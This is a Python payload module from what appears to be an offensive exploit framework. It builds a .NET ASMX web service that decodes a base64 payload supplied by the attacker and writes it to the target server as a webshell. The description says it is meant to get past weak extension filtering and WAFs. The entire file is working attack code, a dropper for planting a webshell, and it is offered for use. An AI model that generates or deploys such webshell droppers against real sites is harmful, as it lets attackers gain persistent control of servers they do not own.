#!/usr/bin/env python

"""
@Author: Castiel
@Email:  ca3tie1@gmail.com
@Blog:   https://ca3tie1.github.io
@Git:    https://github.com/ca3tie1
@Wechat: Ca5tie1
@Date:   2021/11/18 9:39
"""

from ExpDepos.libs.core.base.PayloadBase import *


class AsmxWriteFile(PayloadBase):
    Name = 'asmx write file'  # payload名称
    Alias = 'asmx2file'  # 漏洞别名
    Author = 'Castiel'  # 编写作者
    Category = EXP_CATEGORY.EXPLOITS.WEBAPP
    Create_Date = '2021-11-18'  # payload编写日期
    Update_Date = '2021-11-18'  # payload更新日期
    Desc = """.net asmx webshell自定义写文件"""
    Description = """
.net 网站可执行asmx扩展的脚本，使用该脚本写入自定义payload的webshell，适用于一些对扩展名及内容过滤不严对WAF场景。
    """

    def _options(self):
        options = dict()
        options["filename"] = OptString("app.aspx", description="生成shell的相对路径和文件名", require=True)
        options["text"] = OptPayload("", description="生成shell的内容(base64编码)", require=True)
        return options

    def asmx_raw(self, filename, text):
        return '''<%@ WebService Language="C#" Class="Service" %>
using System;
using System.Web;
using System.IO;
using System.Web.Services;

[WebService(Namespace = "http://www.wooyun.org/whitehats/RedFree")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]

public class Service : System.Web.Services.WebService
{
 [WebMethod]
    public string Chopper() {
       String R = "";
        Byte[] bs = Convert.FromBase64String("{payload}");
        String Destr = System.Text.Encoding.UTF8.GetString(bs);
        File.WriteAllText(Server.MapPath("{filename}"), Destr);


            HttpContext.Current.Response.Write("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
            HttpContext.Current.Response.Write("<data>");
            HttpContext.Current.Response.Write("<![CDATA[");
            HttpContext.Current.Response.Write("\x2D\x3E\x7C" + R + "\x7C\x3C\x2D");
            HttpContext.Current.Response.Write("]]>");
            HttpContext.Current.Response.Write("</data>");
            HttpContext.Current.Response.End();
        return "";
    }
}'''.replace('{filename}', filename).replace('{payload}', text)

    def _generate(self):
        return self.asmx_raw(self.get_option("filename"), self.get_option("text"))
